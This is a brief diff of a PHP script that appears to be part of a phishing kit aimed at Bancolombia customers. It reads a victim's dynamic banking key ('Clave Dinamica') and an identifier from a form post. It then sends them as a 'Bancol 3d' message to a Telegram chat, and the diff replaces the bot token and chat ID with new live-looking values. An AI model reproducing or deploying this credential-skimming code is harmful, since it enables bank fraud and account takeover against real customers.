@@ -20,8 +20,8 @@ $cDinamica = $_POST['cDinamica'];
 
 
 //Datos del bot
-$token = "5815633541:AAEMcaDwu8HMK_VjBGaUORPnI82iMKxSiMs";
-$chatId = "-1001894246538";
+$token = "8390867557:AAFoTxbkMrDmVnMD66tqbSZk_T5hvoGx0X4";
+$chatId = "-5085714220";
 
 $mensaje = "Bancol 3d: Clave Dinamica: ".$cDinamica." Cc: ".$codigo;
 enviarMensajeTelegram($chatId, $mensaje, $token);
